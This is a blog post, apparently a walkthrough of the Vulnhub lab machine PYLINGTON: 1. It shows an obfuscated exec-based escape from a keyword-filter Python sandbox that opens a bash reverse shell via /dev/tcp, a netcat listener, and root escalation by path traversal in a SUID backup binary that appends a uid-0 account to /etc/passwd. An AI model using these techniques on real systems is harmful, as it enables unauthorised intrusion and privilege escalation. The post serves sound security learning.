---
layout: post
title:  "Vulnhub: PYLINGTON: 1"
date:   2021-04-22 21:00:00 +1100
category: hacking
---

## PYLINGTON: 1
This is [PYLINGTON: 1](https://www.vulnhub.com/entry/pylington-1,684/) from Vulnhub. It doesn't have a rating but I'm going to say it was easy.

## Ports
SSH and HTTP, and running on Arch Linux. That's interesting, isn't it? No? Whatever.

## Web
We have an online python interpreter but in order to use it we are supposed to register; but registration has been disabled. *robots.txt* points us to */zbir7mn240soxhicso2z*, which contains some credentials, and we can use that to login. Once logged in, we get a page where we can enter a python program, give it input and see the output. 

We are also told:

>This online IDE is protected with NoImportOS™, an unescapable™ sandbox. NoImportOS™ is secure because of its simplicity; it's only 9 lines of code (available here)

What does that code look like?

{% highlight python %}
def check_if_safe(code: str) -> bool:
    if 'import' in code: # import is too dangerous
        return False
    elif 'os' in code: # os is too dangerous
        return False
    elif 'open' in code: # opening files is also too dangerous
        return False
    else:
        return True
{% endhighlight %}

So it's literally looking for the strings 'os', 'import' and 'open'. Should be easy, yes?

Here's my reverse shell - there are other ways of doing this, but this was mine:

{% highlight python %}
a = "im"
b = "port "
c = "o"
d = "s;"
e = "s"
f = ".system"
g = "('bash -i >& /dev/tcp/192.168.1.204/1234 0>&1')"
exec(a+b+c+d+c+e+f+g)
{% endhighlight %}

Does it work? Of course!

{% highlight shell %}
┌──(root💀kali)-[/opt/vulnhub/pylington]
└─# nc -nvlp 1234                                                                                                                                           1 ⨯
listening on [any] 1234 ...
connect to [192.168.1.204] from (UNKNOWN) [192.168.1.205] 38754
bash: cannot set terminal process group (186): Inappropriate ioctl for device
bash: no job control in this shell
[http@archlinux /]$
{% endhighlight %}

## PY and root
Getting to user (py) was very simple with an SUID binary:

{% highlight shell %}
[http@archlinux py]$ ./typing
./typing
Let's play a game! If you can type the sentence below, then I'll tell you my password.

the quick brown fox jumps over the lazy dog
the quick brown fox jumps over the lazy dog
54ezhCGaJV
[http@archlinux py]$ su py
su py
Password: 54ezhCGaJV
python3 -c 'import pty;pty.spawn("/bin/bash");'
[py@archlinux ~]$
{% endhighlight %}

Well, that was easy. The source code for the *typing* binary was provided too. 

Now, for root we have another SUID binary:

{% highlight shell %}
[py@archlinux secret_stuff]$ ls -lash
ls -lash
total 40K
4.0K drwx------ 2 py   py   4.0K Apr 22 08:38 .
4.0K dr-xr-xr-x 3 py   py   4.0K Apr 16 23:41 ..
 28K -rwsr-xr-x 1 root root  26K Apr  9 19:30 backup
4.0K -rw-r--r-- 1 root root  586 Apr  9 19:30 backup.cc
[py@archlinux secret_stuff]$ cat backup.cc
cat backup.cc
#include <iostream>
#include <string>
#include <fstream>

int main(){
    std::cout<<"Enter a line of text to back up: ";
    std::string line;
    std::getline(std::cin,line);
    std::string path;
    std::cout<<"Enter a file to append the text to (must be inside the /srv/backups directory): ";
    std::getline(std::cin,path);

    if(!path.starts_with("/srv/backups/")){
        std::cout<<"The file must be inside the /srv/backups directory!\n";
    }
    else{
        std::ofstream backup_file(path,std::ios_base::app);
        backup_file<<line<<'\n';
    }

    return 0;
}
[py@archlinux secret_stuff]$
{% endhighlight %}

What can we do with this? The trick is that the output directory has to *start with* */srv/backups*; but it doesn't have to end there.

{% highlight shell %}
[py@archlinux secret_stuff]$ ./backup
./backup
Enter a line of text to back up: root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
Enter a file to append the text to (must be inside the /srv/backups directory): /srv/backups/../../etc/passwd
/srv/backups/../../etc/passwd
[py@archlinux secret_stuff]$ cat /etc/passwd
cat /etc/passwd
root:x:0:0::/root:/bin/bash
bin:x:1:1::/:/usr/bin/nologin
# snipped out for brevity
py:x:1000:1000::/home/py:/bin/bash
git:x:974:974:git daemon user:/:/usr/bin/git-shell
redis:x:973:973:Redis in-memory data structure store:/var/lib/redis:/usr/bin/nologin
root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash
[py@archlinux secret_stuff]$ su root2
su root2
Password: mrcake

[root@archlinux secret_stuff]# cd /root
cd /root
[root@archlinux ~]# ls -lash
ls -lash
total 64K
4.0K drwxr-x---  6 root root 4.0K Apr 16 23:42 .
4.0K drwxr-xr-x 17 root root 4.0K Apr 17 00:23 ..
8.0K -rw-------  1 root root 4.3K Apr 17 00:28 .bash_history
4.0K drwx------  4 root root 4.0K Apr  7 19:19 .cache
4.0K drwx------  3 root root 4.0K Apr  8 18:51 .config
4.0K drwx------  3 root root 4.0K Apr  7 18:27 .gnupg
4.0K -rw-------  1 root root  105 Apr  7 19:33 .rediscli_history
4.0K drwxr-xr-x  2 root root 4.0K Apr  7 19:06 .vim
 20K -rw-------  1 root root  17K Apr 16 23:42 .viminfo
4.0K -rw-r--r--  1 root root  336 Apr  7 19:01 .vimrc
4.0K -rw-r--r--  1 root root   33 Apr 16 23:42 root.txt
[root@archlinux ~]# id
uid=0(root) gid=0(root) groups=0(root)
[root@archlinux ~]# cat root.txt
cat root.txt
63a9f0ea7bb98050796b649e85481845
[root@archlinux ~]#
{% endhighlight %}
